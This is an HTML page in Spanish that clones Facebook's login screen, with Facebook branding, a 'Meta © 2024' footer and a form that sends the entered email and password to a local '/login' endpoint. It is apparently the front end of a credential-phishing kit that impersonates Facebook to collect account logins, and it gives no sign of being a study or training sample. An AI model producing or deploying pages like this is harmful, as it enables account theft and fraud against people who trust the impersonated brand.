<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
        }
        .login-box {
            background-color: white;
            padding: 30px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 360px;
            margin: 0 auto;
        }
        .login-box h1 {
            color: #1877f2;
            font-size: 36px;
            margin-bottom: 20px;
        }
        .login-box h2 {
            font-size: 20px;
            margin-bottom: 20px;
            color: #333;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }
        .login-box button:hover {
            background-color: #145dbf;
        }
        .login-box a {
            display: block;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .login-box a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>facebook</h1>
            <h2>Iniciar sesión en Facebook</h2>
            <form action="/login" method="POST">
                <input type="email" name="email" placeholder="Correo electrónico o número de teléfono" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
            </form>
            <a href="#">¿Olvidaste tu cuenta?</a>
            <a href="#">Regístrate en Facebook</a>
        </div>
        <div class="footer">
            <p>Meta © 2024</p>
        </div>
    </div>
</body>
</html>
